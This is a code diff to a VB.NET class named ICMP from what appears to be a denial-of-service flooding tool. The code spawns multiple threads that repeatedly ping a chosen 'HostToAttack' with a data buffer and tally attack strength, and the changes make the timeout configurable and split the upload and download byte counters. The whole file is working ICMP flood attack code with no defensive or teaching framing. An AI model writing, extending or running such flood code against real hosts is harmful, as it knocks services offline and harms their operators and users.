@@ -1,7 +1,7 @@
 ﻿Imports System.Text
 Imports System.Threading
 Imports System.Net.NetworkInformation
-Class ICMP
+Public Class ICMP
     Private _ThreadsEnded = 0
     Private HostToAttack As String
     Private TimetoAttack As Integer
@@ -11,6 +11,7 @@ Class ICMP
     Private Attacks As Integer = 0
     Private Threadsto As Integer
     Private Length As Integer
+    Private Timeout As Integer
     Private _Floodsbase As Floodsbase
     Public Sub New(ByVal model As ICMPModel, ByVal Floodsbase As Floodsbase)
         _Floodsbase = Floodsbase
@@ -21,6 +22,7 @@ Class ICMP
             TimetoAttack = model.Time
             Threadsto = model.ThreadstoUse
             Length = model.Length
+            Timeout = model.Timeout
             Threads = New Thread(Threadsto - 1) {}
             _Floodsbase.SetMessage("ICMP Flood started!")
             For i As Integer = 0 To Threadsto - 1
@@ -75,13 +77,11 @@ Class ICMP
                 Try
                     My.Computer.Network.Ping(HostToAttack)
                     Dim pingSender As Ping = New Ping()
-                    'Dim address As IPAddress = IPAddress.Loopback
                     Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)
-                    Dim Timeout As Integer = 10000
                     Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
                     Attacks = Attacks + 1
-                    _Floodsbase.Set_AttackStrengOnByte(Attacks * Length)
-                    _Floodsbase.GetAttackStrengOnByteOnSec(stopwatch)
+                    _Floodsbase.Set_AttackUpStrengOnByte(Attacks * Length)
+                    _Floodsbase.Set_AttackDownStrengOnByte(Attacks * Length)
                     Continue Do
                 Catch
                     Continue Do
